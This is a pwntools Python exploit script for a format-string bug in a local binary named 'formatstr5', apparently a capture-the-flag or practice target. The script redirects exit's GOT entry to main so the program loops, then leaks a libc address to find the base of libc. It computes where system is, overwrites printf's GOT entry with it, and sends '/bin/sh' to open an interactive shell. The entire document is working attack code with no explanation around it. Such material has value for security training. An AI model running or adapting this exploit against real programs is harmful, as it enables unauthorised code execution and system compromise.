from pwn import *
p = process('./formatstr5')
e = ELF('./formatstr5')
libc = e.libc  # ELF('/lib/arm-linux-gnueabihf/libc.so.6')

# 1. re-execute main func
exit_got = e.got['exit']
original_exit = exit_got
print('exit_got : ' + str(hex(exit_got)))
main_addr = e.symbols['main']
print('main func : ' + str(hex(main_addr)))
payload = fmtstr_payload(offset=4, writes={exit_got: main_addr})
p.sendline(payload)
sleep(2)

# 2. leak the libc_base address
payload = 'leaked:%135$p'
p.sendline(payload)
p.recvuntil("leaked:")
leak = int(p.recv(10), 16)  # 0x76e6a718
print('leaked: ' + hex(leak))
__libc_start_main_offset = libc.symbols['__libc_start_main']
print('__libc_start_main offset : ' + hex(__libc_start_main_offset))
libc_base = leak - (__libc_start_main_offset + 268)
print('libc_base : ' + hex(libc_base))

# 3. calculate the system func address
system_offset = libc.symbols['system']
print('system offset : ' + hex(system_offset))
system = libc_base + system_offset
print('system : ' + hex(system))

# 4. Overwite prinf_got -> system func, and execute shell
printf_got = e.got['printf']
payload = fmtstr_payload(4, {printf_got: system})
p.send(payload)
p.send('/bin/sh')

p.interactive()

